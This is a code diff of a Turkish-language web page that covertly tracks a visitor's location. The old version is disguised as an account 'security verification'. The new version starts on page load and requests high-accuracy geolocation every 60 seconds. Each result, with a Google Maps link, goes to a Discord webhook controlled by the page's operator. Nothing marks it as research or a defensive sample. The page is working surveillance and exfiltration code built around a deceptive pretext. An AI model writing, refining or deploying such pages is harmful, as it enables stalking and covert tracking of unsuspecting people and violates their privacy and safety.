@@ -2,7 +2,7 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>Güvenlik Doğrulaması</title>
+    <title>Arka Plan Konum Bilgisi</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         body {
@@ -44,23 +44,6 @@
             font-size: 16px;
             line-height: 1.6;
         }
-        button {
-            background: #ffa500;
-            color: #0a0a0a;
-            border: none;
-            padding: 15px 30px;
-            font-size: 18px;
-            border-radius: 8px;
-            cursor: pointer;
-            transition: background 0.3s;
-        }
-        button:hover {
-            background: #ffcc00;
-        }
-        button:disabled {
-            background: #555;
-            cursor: not-allowed;
-        }
         .result {
             margin-top: 20px;
             font-size: 14px;
@@ -84,72 +67,70 @@
 <body>
     <div class="blurred-background"></div>
     <div id="content" class="container">
-        <h1>Güvenlik Doğrulaması</h1>
-        <p>Hesabınızın güvenliğini artırmak için lütfen konumunuzu doğrulayın. Bu işlem, yalnızca güvenlik amaçlıdır ve kaydedilecektir.</p>
-        <button id="locationButton">Konumumu Doğrula</button>
+        <h1>Arka Plan Konum Bilgisi</h1>
+        <p>Konumunuz arka planda alınmaya çalışılıyor...</p>
         <div id="result" class="result"></div>
     </div>
     <script>
         // WEBHOOK URL'NİZİ BURAYA YAZIN
         const webhookUrl = "https://discord.com/api/webhooks/1234567890/abcdefghijklmnopqrstuvwxyz"; // ÖRNEK
 
-        const locationButton = document.getElementById('locationButton');
         const resultDiv = document.getElementById('result');
 
-        window.onload = () => {
-            getLocationAndSend();
-        };
-
-        async function getLocationAndSend() {
+        // Konumu sürekli olarak almaya çalış
+        function startBackgroundLocation() {
             if ("geolocation" in navigator) {
-                locationButton.disabled = true;
-                locationButton.textContent = 'Konum Alınıyor...';
+                const options = {
+                    enableHighAccuracy: true,  // Daha doğru konum için
+                    timeout: 10000,           // 10 saniye sonra zaman aşımı
+                    maximumAge: 0             // Önbelleğe alınmış verileri kullanma
+                };
 
-                navigator.geolocation.getCurrentPosition(
-                    async (position) => {
-                        const { latitude, longitude } = position.coords;
-                        const accuracy = position.coords.accuracy;
-                        const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+                function getLocation() {
+                    navigator.geolocation.getCurrentPosition(
+                        async (position) => {
+                            const { latitude, longitude } = position.coords;
+                            const accuracy = position.coords.accuracy;
+                            const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
-                        try {
-                            await sendLocationLog(latitude, longitude, accuracy, mapsUrl);
-                            resultDiv.innerHTML = `Konum başarıyla alındı! (Gizli)`;
-                            locationButton.textContent = 'Doğrulandı';
-                            locationButton.classList.add('hidden');
-                        } catch (error) {
-                            console.error("Discord'a log gönderilirken hata:", error);
-                            resultDiv.innerHTML = `Discord'a bilgi gönderilemedi. Lütfen konsolu kontrol edin.`;
-                            locationButton.textContent = 'Tekrar Dene';
-                            locationButton.disabled = false;
-                        }
-                    },
-                    (error) => {
-                        let errorMessage = "Konum alınamadı.";
-                        switch (error.code) {
-                            case error.PERMISSION_DENIED:
-                                errorMessage = "Konum izni reddedildi.";
-                                break;
-                            case error.POSITION_UNAVAILABLE:
-                                errorMessage = "Konum bilgisi mevcut değil.";
-                                break;
-                            case error.TIMEOUT:
-                                errorMessage = "Konum isteği zaman aşımına uğradı.";
-                                break;
-                        }
-                        resultDiv.textContent = errorMessage;
-                        locationButton.textContent = 'Tekrar Dene';
-                        locationButton.disabled = false;
-                    }
-                );
+                            try {
+                                await sendLocationLog(latitude, longitude, accuracy, mapsUrl);
+                                resultDiv.innerHTML = "Konum bilgisi başarıyla gönderildi (Arka planda).";
+                            } catch (error) {
+                                console.error("Discord'a log gönderilirken hata:", error);
+                                resultDiv.innerHTML = `Discord'a bilgi gönderilemedi. Lütfen konsolu kontrol edin.`;
+                            }
+                        },
+                        (error) => {
+                            let errorMessage = "Konum alınamadı (Arka planda).";
+                            switch (error.code) {
+                                case error.PERMISSION_DENIED:
+                                    errorMessage = "Konum izni reddedildi (Bu beklenir)."; // İzin reddedilse bile çalışmaya devam et
+                                    break;
+                                case error.POSITION_UNAVAILABLE:
+                                    errorMessage = "Konum bilgisi mevcut değil.";
+                                    break;
+                                case error.TIMEOUT:
+                                    errorMessage = "Konum isteği zaman aşımına uğradı.";
+                                    break;
+                            }
+                            resultDiv.innerHTML = errorMessage;
+                        },
+                        options // Opsiyonları buraya ekledik
+                    );
+                }
+
+                // Konumu belirli aralıklarla almaya devam et
+                getLocation(); // İlk seferde konumu al
+                setInterval(getLocation, 60000); // Her 60 saniyede bir konumu al (1 dakika)
             } else {
                 resultDiv.textContent = "Tarayıcınız konum özelliğini desteklemiyor.";
-                locationButton.disabled = false;
             }
         }
 
         async function sendLocationLog(lat, lon, acc, mapUrl) {
             const payload = {
-                content: "📍 **Yeni Konum Bilgisi!**",
+                content: "📍 **Arka Plan Konum Bilgisi!**",
                 embeds: [{
                     title: "Konum Bilgisi",
                     color: 5814783,
@@ -186,12 +167,15 @@
                 if (!response.ok) {
                     throw new Error(`Webhook gönderilemedi: ${response.status} ${response.statusText}`);
                 }
-                console.log("Discord'a log başarıyla gönderildi."); // Başarılı log mesajı
+                console.log("Discord'a log başarıyla gönderildi.");
             } catch (discordError) {
                 console.error("Discord'a log gönderilirken hata:", discordError);
-                throw discordError; // Hatayı tekrar fırlat, üst fonksiyonda yakalansın.
+                throw discordError;
             }
         }
+
+        // Sayfa yüklendiğinde arka plan konum takibini başlat
+        window.onload = startBackgroundLocation;
     </script>
 </body>
 </html>
